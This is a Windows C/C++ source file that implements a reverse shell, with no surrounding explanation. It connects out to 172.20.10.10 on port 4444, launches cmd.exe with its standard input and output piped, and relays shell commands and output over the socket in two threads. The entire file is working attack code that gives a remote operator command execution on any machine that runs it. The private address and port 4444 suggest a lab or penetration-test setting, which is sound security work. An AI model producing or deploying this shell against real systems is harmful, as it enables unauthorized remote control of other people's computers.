#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "Ws2_32.lib")

DWORD WINAPI ReadFromCmd(LPVOID lpParam)
{
    SOCKET sockt = ((SOCKET*)lpParam)[0];
    HANDLE hStdOutRead = ((HANDLE*)lpParam)[1];

    char buffer[1024];
    DWORD bytesRead;

    while (true)
    {
        if (PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0)
        {
            if (ReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
            {
                send(sockt, buffer, bytesRead, 0);
            }
        }
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI WriteToCmd(LPVOID lpParam)
{
    SOCKET sockt = ((SOCKET*)lpParam)[0];
    HANDLE hStdInWrite = ((HANDLE*)lpParam)[2];

    char buffer[1024];
    int recvSize;
    DWORD bytesWritten;

    while (true)
    {
        recvSize = recv(sockt, buffer, sizeof(buffer), 0);
        if (recvSize > 0)
        {
            WriteFile(hStdInWrite, buffer, recvSize, &bytesWritten, NULL);
        }
        else if (recvSize == 0 || recvSize == SOCKET_ERROR)
        {
            break;
        }
        Sleep(10);
    }
    return 0;
}

int main()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        return 1;
    }

    SOCKET sockt = socket(AF_INET, SOCK_STREAM, 0);
    if (sockt == INVALID_SOCKET)
    {
        WSACleanup();
        return 1;
    }

    sockaddr_in revsockaddr = {};
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(4444);
    inet_pton(AF_INET, "172.20.10.10", &revsockaddr.sin_addr);

    if (connect(sockt, (sockaddr*)&revsockaddr, sizeof(revsockaddr)) != 0)
    {
        closesocket(sockt);
        WSACleanup();
        return 1;
    }

    HANDLE hStdInRead = NULL, hStdInWrite = NULL;
    HANDLE hStdOutRead = NULL, hStdOutWrite = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0))
        return 1;
    if (!CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0))
        return 1;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdInRead;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;

    wchar_t cmd[] = L"cmd.exe";

    if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        closesocket(sockt);
        WSACleanup();
        return 1;
    }

    CloseHandle(hStdInRead);
    CloseHandle(hStdOutWrite);

    HANDLE handles[3] = { (HANDLE)sockt, hStdOutRead, hStdInWrite };

    // Spawn threads
    CreateThread(NULL, 0, ReadFromCmd, handles, 0, NULL);
    CreateThread(NULL, 0, WriteToCmd, handles, 0, NULL);

    // Main thread waits for process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sockt);
    WSACleanup();
    return 0;
}
